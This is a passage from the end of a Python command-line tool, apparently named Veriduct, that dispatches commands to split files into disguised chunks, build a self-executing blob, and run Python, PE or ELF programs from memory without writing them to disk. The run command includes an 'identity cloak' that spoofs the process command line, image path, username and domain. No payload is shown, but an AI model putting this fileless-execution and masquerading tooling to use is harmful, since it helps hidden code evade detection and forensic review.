                return 1
            if args.chunk_jitter < 0.0 or args.chunk_jitter > 0.5:
                logging.error("--chunk-jitter must be between 0.0 and 0.5")
                return 1

            result = annihilate_path(
                input_path=args.input_path,
                out_dir=args.out_dir,
                wipe_size=args.wipe_bytes,
                use_variable_chunks=args.variable_chunks,
                chunk_jitter=args.chunk_jitter,
                use_ssm=args.ssm,
                ssm_null_rate=args.ssm_null_rate,
                use_entanglement=args.entanglement,
                entanglement_group_size=args.entanglement_groups,
                use_fake_chunks=args.fake_chunks,
                fake_ratio=args.fake_ratio,
                add_hmac=not args.no_hmac,
                disguise=args.disguise,
                force_internal=args.force_internal,
                verbose=args.verbose
            )
            
            # Build blob if requested
            if result == 0 and args.blob:
                keymap_path = os.path.join(args.out_dir, KEY_FILE)
                chunks_db_path = os.path.join(args.out_dir, DB_FILE)
                
                if args.blob_output:
                    blob_output = args.blob_output
                else:
                    # Default: input_name.vdb
                    base_name = os.path.splitext(os.path.basename(args.input_path))[0]
                    blob_output = os.path.join(args.out_dir, f"{base_name}.vdb")
                
                logging.info("")
                logging.info("=" * 60)
                logging.info("BUILDING SELF-EXECUTING BLOB")
                logging.info("=" * 60)
                
                if build_blob(keymap_path, chunks_db_path, blob_output, args.blob_quiet):
                    logging.info("")
                    logging.info(f"✓ Blob ready: {blob_output}")
                    logging.info(f"  Run with: ./{os.path.basename(blob_output)}")
                else:
                    logging.error("Blob build failed")
                    return 1
            
            return result

        elif args.command == "reassemble":
            if not os.path.exists(args.key_path):
                logging.error(f"Key file not found: {args.key_path}")
                return 1
            
            return reassemble_path(
                key_path=args.key_path,
                out_dir=args.out_dir,
                disguise=args.disguise,
                ignore_integrity=args.ignore_integrity,
                verbose=args.verbose
            )

        elif args.command == "run":
            if not os.path.exists(args.key_path):
                logging.error(f"Key file not found: {args.key_path}")
                return 1

            logging.info("=" * 60)
            logging.info("VERIDUCT SEMANTIC EXECUTION MODE")
            logging.info("Files execute from chunks without disk materialization")
            logging.info("Supports: Python (.pyc/.py), PE (.exe/.dll), ELF")
            logging.info("=" * 60)

            # Build cloak config
            cloak_preset = getattr(args, 'cloak', None)
            cloak_custom = None
            if cloak_preset == "custom":
                cloak_custom = {}
                if args.cloak_cmd:
                    cloak_custom["command_line"] = args.cloak_cmd
                if args.cloak_image:
                    cloak_custom["image_path"] = args.cloak_image
                if args.cloak_dir:
                    cloak_custom["current_dir"] = args.cloak_dir
                if args.cloak_user:
                    cloak_custom["env_username"] = args.cloak_user
                if args.cloak_domain:
                    cloak_custom["env_userdomain"] = args.cloak_domain

            if cloak_preset:
                logging.info(f"Identity Cloak: {cloak_preset}")

            return run_annihilated_path(
                key_path=args.key_path,
                disguise=args.disguise,
                ignore_integrity=args.ignore_integrity,
                verbose=args.verbose,
                cloak_preset=cloak_preset,
                cloak_custom=cloak_custom
            )

        else:
            parser.print_help()
            return 1

    except KeyboardInterrupt:
        logging.info("Operation cancelled by user")
        return 130
    except Exception as e:
        logging.error(f"Unexpected error: {e}")
        if args.verbose:
            import traceback
            logging.error(traceback.format_exc())
        return 1


if __name__ == "__main__":
    sys.exit(main())
